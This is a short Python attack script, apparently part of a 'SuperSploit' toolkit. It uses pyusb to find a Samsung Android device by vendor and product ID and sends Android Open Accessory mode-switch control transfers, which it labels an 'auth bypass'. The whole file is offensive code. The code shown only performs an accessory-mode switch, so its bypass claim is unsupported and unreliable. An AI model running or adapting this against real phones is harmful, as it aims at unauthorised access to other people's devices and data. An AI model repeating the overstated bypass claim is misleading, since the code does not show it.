
import sys
import os
import time
sys.path.append('/home/donald/.SuperSploit/source')

try:
    import usb.core
    import usb.util
except ImportError:
    print("[-] pyusb not found")
    sys.exit(1)

def trigger_auth_bypass(vid, pid):
    try:
        dev = usb.core.find(idVendor=vid, idProduct=pid)
        if dev is None:
            print(f"[-] Device 0x{vid:04x}:0x{pid:04x} not found.")
            return

        print(f"[*] Sending AOA Mode Switch to 0x{vid:04x}:0x{pid:04x}...")
        dev.ctrl_transfer(0xC0, 51, 0, 0, 2)
        dev.ctrl_transfer(0x40, 52, 0, 0, b"Samsung\0")
        dev.ctrl_transfer(0x40, 52, 0, 1, b"Galaxy\0")
        dev.ctrl_transfer(0x40, 52, 0, 2, b"1.0\0")
        dev.ctrl_transfer(0x40, 53, 0, 0, 0)
        
        print("[+] Auth Bypass signals sent.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    trigger_auth_bypass(0x04e8, 0x6860)
